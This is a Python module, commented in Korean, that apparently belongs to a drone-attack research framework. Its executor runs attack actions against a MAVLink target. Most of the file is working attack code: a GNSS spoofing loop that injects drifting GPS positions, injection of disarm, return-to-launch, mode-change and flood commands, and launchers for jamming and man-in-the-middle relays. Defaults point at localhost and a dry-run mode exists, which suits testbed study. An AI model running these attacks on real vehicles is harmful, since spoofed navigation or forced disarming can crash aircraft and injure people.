"""Tool Executor — 기술스택 문서 §4.1.

정책 게이트를 통과한 공격 행동(AttackAction)을 실제 공격 도구로 실행한다. 기존
`attacks/` 툴킷을 allowlist 어댑터로 감싼다(문서 §9 "기존 공격 함수를 AttackTool 로 래핑").

  - wait       : 비동기 대기(은신).
  - gnss_spoof : attacks.gnss_spoof 의 GPS_INPUT 주입 루프(라이브, 주입 포트).
  - c2_inject  : attacks.c2_injection 의 명령 폭주/단발(라이브, 주입 포트).
  - jam        : attacks.jamming_dos 릴레이(서브프로세스, 링크 경로 필요 → 기본 게이트 차단).
  - mitm       : attacks.mitm_intercept 릴레이(서브프로세스, 링크 경로 필요 → 기본 게이트 차단).

블로킹 도구는 asyncio.to_thread 로 실행해 이벤트 루프를 막지 않는다. dry_run 이면 실제
패킷을 보내지 않고 결과만 모사한다(단위 테스트/오프라인 검증용).
"""
from __future__ import annotations

import asyncio
import math
import subprocess
import sys
import time
from dataclasses import dataclass, field

from core.events import AttackAction


@dataclass
class ExecResult:
    tool: str
    params: dict
    duration_s: float
    detail: dict = field(default_factory=dict)
    ok: bool = True


class ToolExecutor:
    def __init__(self, inject_target: str, dry_run: bool = False) -> None:
        self.inject_target = inject_target
        self.dry_run = dry_run
        self._gnss_conn = None
        self._c2_conn = None

    # ---------------- 공개 API ----------------
    async def execute(self, action: AttackAction) -> ExecResult:
        tool = action.tool
        p = action.parameters
        if tool == "wait":
            dur = float(p.get("duration_s", 1.0))
            await asyncio.sleep(0.0 if self.dry_run else dur)
            return ExecResult(tool, p, dur, {"note": "은신/대기"})
        if self.dry_run:
            # 실제 전송 없이 결과 모사(파라미터 반영)
            return ExecResult(tool, p, self._nominal_duration(tool, p),
                              {"dry_run": True})
        if tool == "gnss_spoof":
            return await asyncio.to_thread(self._run_gnss, p)
        if tool == "c2_inject":
            return await asyncio.to_thread(self._run_c2, p)
        if tool == "jam":
            return await asyncio.to_thread(self._run_subprocess_jam, p)
        if tool == "mitm":
            return await asyncio.to_thread(self._run_subprocess_mitm, p)
        return ExecResult(tool, p, 0.0, {"error": "unknown tool"}, ok=False)

    def _nominal_duration(self, tool: str, p: dict) -> float:
        if tool == "gnss_spoof":
            return float(p.get("ramp_s", 4.0)) + float(p.get("hold_s", 3.0))
        if tool == "c2_inject":
            return float(p.get("count", 6)) * 0.05
        return float(p.get("duration_s", 1.0))

    # ---------------- 라이브 어댑터 ----------------
    def _run_gnss(self, p: dict) -> ExecResult:
        from pymavlink import mavutil
        from attacks.gnss_spoof import (HOME_LAT, HOME_LON, meters_to_latlon,
                                        send_gps_input)
        if self._gnss_conn is None:
            self._gnss_conn = mavutil.mavlink_connection(
                self.inject_target, source_system=200)
        m = self._gnss_conn
        drift = float(p.get("drift_m", 120.0))
        ramp = float(p.get("ramp_s", 4.0))
        hold = float(p.get("hold_s", 3.0))
        rate = float(p.get("rate", 5.0))
        bearing = float(p.get("bearing_deg", 90.0))
        dt = 1.0 / rate
        t0 = time.time()
        total = ramp + hold
        n = 0
        while time.time() - t0 < total:
            t = time.time() - t0
            off = drift * min(1.0, t / max(1e-3, ramp))
            dn = off * math.cos(math.radians(bearing))
            de = off * math.sin(math.radians(bearing))
            dlat, dlon = meters_to_latlon(dn, de, HOME_LAT)
            send_gps_input(m, HOME_LAT + dlat, HOME_LON + dlon)
            n += 1
            time.sleep(dt)
        # 스푸핑 해제(펄스화): HOME 좌표를 몇 프레임 주입해 오프셋을 0으로 되돌린다.
        # → 각 GNSS 공격을 독립 펄스로 만들어 arm 별 보상 귀속을 깨끗하게 유지.
        for _ in range(5):
            send_gps_input(m, HOME_LAT, HOME_LON)
            time.sleep(dt)
        return ExecResult("gnss_spoof", p, total,
                          {"injected_frames": n, "final_drift_m": drift})

    def _run_c2(self, p: dict) -> ExecResult:
        from attacks.c2_injection import (cmd_disarm, cmd_flood, cmd_rtl,
                                          cmd_setmode, connect)
        if self._c2_conn is None:
            self._c2_conn = connect(self.inject_target)
        m = self._c2_conn
        command = str(p.get("command", "flood"))
        t0 = time.time()
        if command == "flood":
            cmd_flood(m, int(p.get("count", 6)))
        elif command == "rtl":
            cmd_rtl(m)
        elif command == "disarm":
            cmd_disarm(m)
        elif command == "setmode":
            cmd_setmode(m, int(p.get("mode_id", 5)))
        time.sleep(0.2)
        return ExecResult("c2_inject", p, time.time() - t0,
                          {"command": command, "count": int(p.get("count", 1))})

    # ---------------- 서브프로세스 어댑터(설계 완결용) ----------------
    def _run_subprocess_jam(self, p: dict) -> ExecResult:
        dur = float(p.get("duration_s", 6.0))
        cmd = [sys.executable, "-m", "attacks.jamming_dos",
               "--listen", str(int(p.get("listen", 14550))),
               "--forward", str(int(p.get("forward", 14551))),
               "--loss", str(p.get("loss", 0.7)),
               "--delay-ms", str(p.get("delay_ms", 400.0)),
               "--duration", str(dur)]
        return self._subprocess(cmd, dur + 3.0, "jam", p)

    def _run_subprocess_mitm(self, p: dict) -> ExecResult:
        dur = float(p.get("duration_s", 10.0))
        cmd = [sys.executable, "-m", "attacks.mitm_intercept",
               "--listen", str(p.get("listen", "udpin:127.0.0.1:14550")),
               "--forward", str(p.get("forward", "udpout:127.0.0.1:14551")),
               "--activate-after", str(p.get("activate_after", 2.0)),
               "--duration", str(dur),
               "--drift-m", str(p.get("drift_m", 120.0))]
        return self._subprocess(cmd, dur + 3.0, "mitm", p)

    def _subprocess(self, cmd: list[str], timeout: float, tool: str,
                    p: dict) -> ExecResult:
        try:
            r = subprocess.run(cmd, timeout=timeout, capture_output=True, text=True)
            return ExecResult(tool, p, timeout, {"returncode": r.returncode}, ok=r.returncode == 0)
        except subprocess.TimeoutExpired:
            return ExecResult(tool, p, timeout, {"note": "timeout(정상 지속 후 종료)"}, ok=True)
        except Exception as e:  # noqa: BLE001
            return ExecResult(tool, p, 0.0, {"error": str(e)}, ok=False)
